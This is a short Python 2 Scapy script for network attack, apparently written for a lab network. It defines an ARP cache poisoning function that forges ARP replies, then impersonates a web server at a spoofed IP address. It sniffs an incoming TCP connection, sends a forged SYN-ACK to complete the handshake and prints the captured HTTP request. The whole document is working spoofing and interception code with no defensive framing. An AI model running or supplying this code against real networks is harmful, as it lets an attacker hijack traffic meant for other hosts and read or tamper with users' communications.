from scapy.all import *

def ARPPoison(macAttacker, macVictim, ipToSpoof, ipVictim):
    arp = Ether() / ARP()
    arp[Ether].src = macAttacker
    arp[ARP].hwsrc = macAttacker
    arp[ARP].psrc = ipToSpoof
    arp[ARP].hwdst = macVictim
    arp[ARP].pdst = ipVictim

    sendp(arp)

ipToSpoof = "192.168.56.103"

print "Listening as " + ipToSpoof
a = sniff(count = 1, filter = "tcp and port 80 and host " + ipToSpoof)
ip = a[0][IP].src
port = a[0].sport
seq = a[0].seq
ack = a[0].seq + 1
print "Connection from " + ip + ":" + str(port)

ipLayer = IP(src = ipToSpoof, dst = ip)
synAck = TCP(sport = 80, dport = port, flags = "SA", seq = seq, ack = ack, options = [('MSS', 1460)])
answer = sr1(ipLayer / synAck)
print "Handshake completed"
# TCP handshake has now been completed

incRequest = sniff(count = 1, filter = "tcp and port 80")
ack = ack + len(incRequest[0].load)
seq = a[0].seq + 1
print incRequest[0].load
